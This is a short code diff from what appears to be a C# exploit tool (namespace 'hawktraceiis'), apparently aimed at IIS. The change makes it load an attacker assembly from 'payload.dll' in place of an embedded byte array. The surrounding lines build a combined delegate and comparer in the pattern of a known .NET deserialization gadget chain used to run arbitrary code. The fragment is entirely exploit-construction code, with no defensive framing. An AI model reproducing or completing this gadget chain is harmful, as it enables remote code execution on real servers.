@@ -26,7 +26,7 @@ namespace hawktraceiis
 
         static void Main(string[] args)
         {
-            byte[] ASSEMBLY_BYTES = new byte[] { .. };
+            byte[] ASSEMBLY_BYTES = File.ReadAllBytes(@"payload.dll");
             Delegate da = new Comparison<Array>(CompareArrays);
             Comparison<Array> d = (Comparison<Array>)MulticastDelegate.Combine(da, da);
             IComparer<Array> comp = Comparer<Array>.Create(d);
